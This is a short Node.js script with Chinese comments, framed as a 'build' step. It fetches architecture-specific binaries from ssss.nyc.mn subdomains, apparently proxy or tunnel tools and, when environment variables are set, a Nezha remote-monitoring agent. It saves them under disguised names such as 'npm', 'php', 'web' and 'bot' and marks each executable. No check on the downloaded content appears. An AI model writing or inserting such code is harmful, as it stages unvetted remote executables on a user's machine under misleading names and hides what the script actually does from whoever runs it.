const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

const FILE_PATH = process.env.FILE_PATH || './tmp';

// 只保留构建相关的函数
function getSystemArchitecture() {
    const arch = os.arch();
    return (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') ? 'arm' : 'amd';
}

function getFilesForArchitecture(architecture) {
    const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
    const NEZHA_PORT = process.env.NEZHA_PORT || '';
    const NEZHA_KEY = process.env.NEZHA_KEY || '';

    let baseFiles;
    if (architecture === 'arm') {
        baseFiles = [
            { fileName: "web", fileUrl: "https://arm64.ssss.nyc.mn/web" },
            { fileName: "bot", fileUrl: "https://arm64.ssss.nyc.mn/2go" }
        ];
    } else {
        baseFiles = [
            { fileName: "web", fileUrl: "https://amd64.ssss.nyc.mn/web" },
            { fileName: "bot", fileUrl: "https://amd64.ssss.nyc.mn/2go" }
        ];
    }

    if (NEZHA_SERVER && NEZHA_KEY) {
        if (NEZHA_PORT) {
            const npmUrl = architecture === 'arm' ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent";
            baseFiles.unshift({ fileName: "npm", fileUrl: npmUrl });
        } else {
            const phpUrl = architecture === 'arm' ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1";
            baseFiles.unshift({ fileName: "php", fileUrl: phpUrl });
        }
    }
    return baseFiles;
}

async function downloadFile(fileName, fileUrl) {
    const filePath = path.join(FILE_PATH, fileName);
    const writer = fs.createWriteStream(filePath);

    const response = await axios({
        method: 'get',
        url: fileUrl,
        responseType: 'stream',
    });

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
        writer.on('finish', () => {
            fs.chmodSync(filePath, 0o755); // 下载后立即授权
            console.log(`Downloaded and empowered ${fileName}`);
            resolve();
        });
        writer.on('error', reject);
    });
}

// 主构建函数
async function build() {
    console.log("Build process started...");
    if (!fs.existsSync(FILE_PATH)) {
        fs.mkdirSync(FILE_PATH, { recursive: true });
        console.log(`${FILE_PATH} is created`);
    }

    const architecture = getSystemArchitecture();
    const filesToDownload = getFilesForArchitecture(architecture);

    if (filesToDownload.length === 0) {
        console.log("No files to download for the current architecture.");
        return;
    }

    try {
        await Promise.all(filesToDownload.map(f => downloadFile(f.fileName, f.fileUrl)));
        console.log("All necessary files have been downloaded.");
        console.log("Build process finished successfully.");
    } catch (err) {
        console.error('Error during build process:', err);
        process.exit(1); // 以失败状态退出
    }
}

build();
